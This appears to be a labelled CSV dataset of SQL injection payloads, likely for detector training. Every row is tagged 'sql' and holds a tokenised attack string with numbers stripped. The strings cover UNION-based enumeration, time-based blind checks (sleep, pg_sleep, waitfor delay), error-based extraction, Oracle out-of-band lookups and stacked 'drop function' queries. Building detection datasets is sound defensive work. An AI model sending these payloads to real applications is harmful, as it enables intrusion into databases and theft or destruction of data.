,language,source
2946,sql,". . . . / / ? = & = & = ' ) ) and sleep ( ) and ( ( ' iypb ' = ' "
2947,sql,". . . / / ? = & = & = & = ' ) ; if ( = ) select else drop function scfl --"
2948,sql,". . / ? = & = & = & = "" union all select null , null , null , null , null # "
2949,sql,". . . . / / ? = & = and = -- "
2950,sql,". . . . / ? = & = "" ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( " zyik " like " "
2951,sql,". . . ? = - ' ) ) ) union all select , , , , , , # "
2952,sql,". . . / ? = - ' ) union all select , , , , , , , # "
2953,sql,". . / / ? = - ' ) union all select , , , , , , , , , -- "
2954,sql,". . . . ? = & = & = & = ' ) union all select null , null , null , null # "
2955,sql,". . / ? = & = "" ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual --"
2956,sql,". . / / / / ? = & = & = & = ) rlike sleep ( ) -- "
2957,sql,". . / / / / ? = & = & = & = ' union all select null , null , null , null , null , null , null , null # "
2958,sql,". . ? = & = - ) union all select , , , , , , , , , -- "
2959,sql,". . . . / / / ? = & = & = & = ) ) ) and = -- "
2960,sql,". . . ? = & = % "" union all select null , null , null , null , null , null , null , null , null , null -- "
2961,sql,". . . / ? = - ' ) ) ) union all select , -- "
2962,sql,". . . / / / ? = - % ' ) union all select , , , , , -- "
2963,sql,". . . . ? = & = & = ' ) ) ) order by -- "
2964,sql,". . . / ? = and elt ( = , sleep ( ) ) # "
2965,sql,". . . . ? = & = - "" ) ) union all select , -- "
2966,sql,". . / / ? = & = - "" union all select , , , , , , , , -- "
2967,sql,". . . ? = ) ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ( = "
2968,sql,". . . / / / ? = "" union all select null , null # "
2969,sql,". . . . / / / / ? = & = ' ) ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ( ' mvyi ' like ' "
2970,sql,". . / / / ? = & = "" ) and elt ( = , sleep ( ) ) and ( " umlc " = " "
2971,sql,". . . . / / / ? = "" ) and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ( " jmor " like " "
2972,sql,". . . . / / / ? = & = & = - "" ) union all select , , , , , # "
2973,sql,". . / / / / ? = & = ' order by # "
2974,sql,". . / / / / ? = & = ' ) union all select null , null , null , null , null # "
2975,sql,". . . . / / / ? = & = & = & = - ' ) union all select , , , , , , , , -- "
2976,sql,". . . / ? = & = - ' ) union all select , , , , , , , # "
2977,sql,". . . . / ? = & = - ' ) ) order by -- "
2978,sql,". . . . / / / / ? = & = ' ) and make_set ( = , ) and ( ' tkot ' = ' "
2979,sql,". . ? = - ) union all select , , , # "
2980,sql,". . . . / / / ? = & = & = & = - ' union all select , , , -- "
2981,sql,". . . . ? = ' and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null -- "
2982,sql,". . . . / / / ? = & = & = & = ' ) union all select null , null , null # "
2983,sql,". . . / / ? = & = , ( select ( case when ( = ) then else cast ( as int ) / ( select from dual ) end ) from dual ) "
2984,sql,". . . . / / / ? = & = & = & = ' and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) -- "
2985,sql,". . / / / / ? = & = & = & = ' ) ) ) and = -- "
2986,sql,". . . ? = & = & = and = % "
2987,sql,". . . . ? = ' union all select null , null , null , null , null -- "
2988,sql,". . . . / / / / ? = & = & = & = % ' ) ) ; waitfor delay ' : : ' --"
2989,sql,". . . . / / / ? = "" ; select pg_sleep ( ) --"
2990,sql,". . . / / ? = & = and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) # "
2991,sql,". . . . / / ? = & = & = & = - ' union all select , , , , , , , # "
2992,sql,". . . ? = ' ) and = dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) and ( ' chxg ' like ' "
2993,sql,". . ? = ) and elt ( = , sleep ( ) ) -- "
2994,sql,". . . . / / ? = & = & = ' ) union all select null , null , null , null , null , null # "
2995,sql,". . . / / / ? = & = & = & = - ) ) union all select , # "
2996,sql,". . . . / / / ? = & = ' ) ) ) and = and ( ( ( ' zmnr ' = ' "
2997,sql,". . . / / / ? = & = ' ) ) order by # "
2998,sql,". . / / / ? = & = & = ' and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ' lxef ' = ' "
2999,sql,". . . / ? = & = & = "" ) and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and ( " vytl " = " "
3000,sql,". . . / ? = & = & = "" ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( " zvvv " = " "
3001,sql,". . . . / / / / ? = & = ' ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( ' aokv ' = ' "
3002,sql,". . / / / ? = & = % "" rlike sleep ( ) and " % " = " "
3003,sql,". . . . / / / ? = & = & = ' and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) and ' tdat ' = ' "
3004,sql,". . . / / / / ? = & = & = ' ) ) ) and make_set ( = , ) and ( ( ( ' dlge ' = ' "
3005,sql,". . ? = & = and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) "
3006,sql,". . / / ? = ' ) and = and ( ' dypw ' like ' "
3007,sql,". . / / / / ? = "" and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and " inqy " = " "
3008,sql,". . . . / / / ? = & = & = - ' ) union all select -- "
3009,sql,". . / / ? = & = ' ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ' eslo ' = ' "
3010,sql,". . . . / / ? = & = - "" union all select -- "
3011,sql,". . ? = & = - "" union all select , , , , -- "
3012,sql,". . . ? = & = & = ) and = -- "
3013,sql,". . . / / / / ? = & = ' ) ) ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ( ( ( ' waly ' = ' "
3014,sql,". . ? = & = & = & = % ' and = -- "
3015,sql,". . . / / / ? = & = & = - % "" union all select , , , , , , , , , -- "
3016,sql,". . . / / / / ? = & = & = "" ) union all select null , null , null # "
3017,sql,". . . . ? = & = & = - "" union all select # "
3018,sql,". . . . / / / ? = & = and = -- "
3019,sql,". . . / / / / ? = & = & = & = ' and ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) -- "
3020,sql,". . . . / / / ? = & = & = ' rlike ( select ( case when ( = ) then xcdfeecaffcdef else x end ) ) -- "
3021,sql,". . . . / / / ? = & = & = ) ) and ( select ( case when ( = ) then null else cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) end ) ) is null and ( ( = "
3022,sql,". . / / / ? = & = ' ) ; if ( = ) select else drop function sdvi --"
3023,sql,". . . . / / / / ? = & = & = and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) # "
3024,sql,". . . / ? = ' ) order by # "
3025,sql,". . . / ? = - ) ) ) union all select , , , , , , # "
3026,sql,". . / / / ? = & = & = & = - % "" union all select , , , , , , , # "
3027,sql,". . . . / / / / ? = "" ) ) and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) and ( ( " ojxu " = " "
3028,sql,". . / ? = & = ) order by # "
3029,sql,". . / / ? = & = - "" union all select , , , , , , , , -- "
3030,sql,". . . / / ? = & = & = ' and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ' lxef ' = ' "
3031,sql,". . . ? = & = - union all select , , , , , , , , -- "
3032,sql,". . / / / / ? = & = ' and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and ' uroo ' = ' "
3033,sql,". . . . / / ? = & = ) ) ) and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ( ( = "
3034,sql,". . . . ? = & = % "" ; if ( = ) select else drop function byzq --"
3035,sql,". . . ? = & = ' ) ) and ( select * from ( select ( sleep ( ) ) ) pjbf ) # "
3036,sql,". . / / ? = - % ' ) ) union all select , , , , , , , -- "
3037,sql,". . / ? = & = & = - union all select , , , # "
3038,sql,". . . ? = & = % ' ) ) ; select dbms_pipe . receive_message ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) , ) from dual --"
3039,sql,". . . . / / / ? = & = & = - ) order by -- "
3040,sql,". . . / ? = & = & = ' and = and ' gwgz ' like ' "
3041,sql,". . . / / / / ? = & = ' ) ) and sleep ( ) and ( ( ' zqqi ' = ' "
3042,sql,". . . . / / / ? = & = ' ) union all select null , null , null # "
3043,sql,". . . . ? = order by -- "
3044,sql,". . . . ? = & = ' ) and = ( select from pg_sleep ( ) ) and ( ' yvxe ' = ' "
3045,sql,". . . . / / / ? = & = % ' ) ) and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and ( ( ' % ' = ' "
3046,sql,". . / / / ? = & = ) ) ; if ( = ) select else drop function cptc --"
3047,sql,". . . . ? = & = & = and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) "
3048,sql,". . / / / ? = & = & = ) and = # "
3049,sql,". . . . ? = & = & = - ' union all select , , # "
3050,sql,". . . / / ? = & = & = & = - ' union all select , , , , , -- "
3051,sql,". . / / ? = & = % ' ) and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) and ( ' % ' = ' "
3052,sql,". . . . / ? = "" ) ; ( select * from ( select ( sleep ( ) ) ) bcts ) # "
3053,sql,". . . / / / / ? = & = & = & = ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) -- "
3054,sql,". . . . ? = & = order by -- "
3055,sql,". . . . / / / / ? = & = ' , ( select ( case when ( = ) then else * ( select from information_schema . plugins ) end ) ) -- "
3056,sql,". . . . / / ? = % ' ) ) union all select null , null , null , null , null , null , null , null -- "
3057,sql,". . . / / ? = - ' ) union all select , , , -- "
3058,sql,". . . . / ? = & = & = - ) ) ) order by -- "
3059,sql,". . . . / / ? = ) ) ) ; select sleep ( ) and ( ( ( = "
3060,sql,". . . ? = ' ) and = # "
3061,sql,". . . . / ? = & = - ) ) union all select , # "
3062,sql,". . . / / / ? = % ' ) ) and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) and ( ( ' % ' = ' "
3063,sql,". . . / / ? = "" ) and updatexml ( , concat ( xe , x , ( select ( elt ( = , ) ) ) , xba ) , ) and ( " buon " = " "
3064,sql,". . ? = & = & = & = - ) order by -- "
3065,sql,". . . . ? = & = & = & = and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) "
3066,sql,". . . / / / ? = & = & = and = convert ( int , ( select char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) # "
3067,sql,". . . / / ? = & = & = - ' ) ) order by # "
3068,sql,". . ? = & = - ' union all select , , , -- "
3069,sql,". . . . / / / ? = & = & = ' union all select null , null , null , null , null , null , null , null -- "
3070,sql,". . . / / / ? = & = & = & = "" ) union all select null , null , null , null # "
3071,sql,". . . . / / ? = & = & = - ' union all select , , , , -- "
3072,sql,". . . . / ? = & = & = & = ' ) ) ) and = -- "
3073,sql,". . . / ? = "" ) ; if ( = ) select else drop function rpwm --"
3074,sql,". . / ? = & = ) ) ; waitfor delay ' : : ' --"
3075,sql,". . . / / / / ? = & = & = - ' ) union all select , , , , -- "
3076,sql,". . . ? = union all select null , null , null # "
3077,sql,". . . ? = & = & = - ) ) union all select , , , , , , # "
3078,sql,". . . . ? = & = ' ) ) ; select sleep ( ) and ( ( ' tkgc ' like ' "
3079,sql,". . . / / / ? = & = & = & = and make_set ( = , ) -- "
3080,sql,". . . . / / / / ? = & = & = & = ' ) ) and = and ( ( ' jgqe ' = ' "
3081,sql,". . . / / ? = & = "" rlike ( select ( case when ( = ) then xaffdedeafffe else x end ) ) and " pohc " like " "
3082,sql,". . . / / ? = & = "" union all select null , null , null , null , null , null # "
3083,sql,". . / / ? = & = % ' and = % "
3084,sql,". . . . / / / ? = & = & = & = union all select null # "
3085,sql,". . . . / / / / ? = & = - % "" union all select , , , # "
3086,sql,". . . . / / ? = & = & = ' ) ) union all select null , null , null , null , null , null , null # "
3087,sql,". . . ? = & = "" ) and = ctxsys . drithsx . sn ( , ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) ) and ( " pywo " = " "
3088,sql,". . / / / ? = & = ( select from ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from information_schema . plugins group by x ) a ) "
3089,sql,". . . / / / ? = & = & = & = ' ) ) ) and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and ( ( ( ' dzzl ' = ' "
3090,sql,". . . . / / / / ? = & = - ' ) ) ) union all select , # "
3091,sql,". . . . / / ? = & = & = & = - ' union all select , , , , , , , -- "
3092,sql,". . . / ? = & = - "" union all select , , , , , -- "
3093,sql,". . / / ? = ' ) ) and = utl_inaddr . get_host_address ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | ( select ( case when ( = ) then else end ) from dual ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) and ( ( ' pvcx ' = ' "
3094,sql,". . / ? = & = & = & = % ' and = # "
3095,sql,". . / ? = % ' rlike ( select * from ( select ( sleep ( ) ) ) irzi ) and ' % ' = ' "
3096,sql,". . . / / / / ? = ) union all select null # "
3097,sql,". . . . / ? = ' ) and elt ( = , sleep ( ) ) and ( ' ekia ' = ' "
3098,sql,". . . . / ? = ) union all select null , null , null , null , null # "
3099,sql,". . / ? = - ' ) union all select , , , , , , , , , -- "
3100,sql,". . / / ? = & = & = & = ' ) ) ) union all select null , null , null , null , null , null # "
3101,sql,". . . ? = ' ) and row ( , ) > ( select count ( * ) , concat ( x , ( select ( elt ( = , ) ) ) , xba , floor ( rand ( ) * ) ) x from ( select union select union select union select ) a group by x ) and ( ' kiwp ' like ' "
3102,sql,". . . / / ? = & = "" and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and " etca " = " "
3103,sql,". . . . / / ? = - % "" union all select , , , , , , -- "
3104,sql,". . . . / / / ? = & = & = ' ) ) ; if ( = ) select else drop function uuex --"
3105,sql,". . / ? = & = & = & = union all select null , null , null # "
3106,sql,". . . . / / ? = & = & = & = % ' ) ) union all select null , null , null , null , null , null -- "
3107,sql,". . . / / ? = & = & = and in ( select ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) + ( select ( case when ( = ) then char ( ) else char ( ) end ) ) +char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) ) # "
3108,sql,". . . ? = & = & = ' and extractvalue ( , concat ( xc , x , ( select ( elt ( = , ) ) ) , xba ) ) -- "
3109,sql,". . . . / / / / ? = & = - union all select , # "
3110,sql,". . / / ? = & = & = % ' ; select ( case when ( = ) then else / ( select ) end ) --"
3111,sql,". . . / / / / ? = & = & = & = - ) order by # "
3112,sql,". . . . / / ? = & = & = ' ) and make_set ( = , ) and ( ' brsz ' like ' "
3113,sql,". . ? = & = & = & = "" ) and sleep ( ) and ( " fvct " like " "
3114,sql,". . . / / / / ? = & = ' ) ) order by # "
3115,sql,". . . . ? = & = & = "" and ( select ( case when ( = ) then null else ctxsys . drithsx . sn ( , ) end ) from dual ) is null and " etca " = " "
3116,sql,". . . . / / ? = ' and = concat ( char ( ) +char ( ) +char ( ) +char ( ) +char ( ) , ( select ( case when ( = ) then char ( ) else char ( ) end ) ) , char ( ) +char ( ) +char ( ) +char ( ) +char ( ) ) and ' vhzs ' = ' "
3117,sql,". . . . ? = & = & = & = "" ) order by # "
3118,sql,". . . ? = & = % ' ) ) and = cast ( ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) | | ( select ( case when ( = ) then else end ) ) : : text | | ( chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) | | chr ( ) ) as numeric ) and ( ( ' % ' = ' "
3119,sql,". . / ? = - % ' ) union all select -- "
3120,sql,". . / / / ? = & = - ) order by -- "
3121,sql,". . . / / / ? = & = & = & = ' union all select null , null , null , null , null -- "
3122,sql,". . / ? = & = & = & = - "" union all select , # "
3123,sql,". . / / / / ? = % ' ) ) order by -- "
3124,sql,". . / ? = ' ) ) ; ( select * from ( select ( sleep ( ) ) ) tqiz ) # "
3125,sql,". . / / / / ? = & = & = - "" union all select , , , , , , # "
3126,sql,". . . ? = & = & = ' ) ) ) ; select ( case when ( = ) then else / ( select ) end ) --"
